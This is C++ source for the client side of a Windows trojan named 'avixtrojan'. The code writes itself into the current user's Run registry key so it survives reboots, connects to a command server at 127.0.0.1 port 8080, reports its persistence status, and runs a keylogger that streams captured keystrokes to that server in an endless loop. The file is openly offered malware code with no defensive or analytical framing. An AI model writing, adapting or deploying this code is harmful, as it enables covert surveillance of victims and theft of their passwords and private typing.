//CLIENT

#include "keylogger.h"
#include "client.h"
#include <Windows.h>


using namespace std;

BOOL IsMyProgramRegisteredForStartup(PCWSTR pszAppName)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwRegType = REG_SZ;
	wchar_t szPathToExe[MAX_PATH] = {};
	DWORD dwSize = sizeof(szPathToExe);

	lResult = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		lResult = RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
		fSuccess = (lResult == 0);
	}

	if (fSuccess)
	{
		fSuccess = (wcslen(szPathToExe) > 0) ? TRUE : FALSE;
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");


	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"avixtrojan", szPathToExe);
}


/*returns path of file with filename.exe*/
string ExePath() 
{
	char buffer[MAX_PATH];
	GetModuleFileName(NULL, buffer, MAX_PATH);
	//string::size_type pos = string(buffer).find_last_of("\\/");
	//return string(buffer).substr(0, pos);
	string temp(buffer);
	return temp;
}



int WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance,
LPTSTR    lpCmdLine,
int       cmdShow)
//int main()
{
	if (!IsMyProgramRegisteredForStartup(L"avixtrojan"))
	{
		RegisterProgram();
	}
	Client client(8080, "127.0.0.1");
	client.c_connect();

	if (IsMyProgramRegisteredForStartup(L"avixtrojan"))
		client.sender("5$Program is registered for startup!");
	else
		client.sender("5$Program is NOT registered for startup!");
	Keylogger k;
	k.start(client); //endless loop
}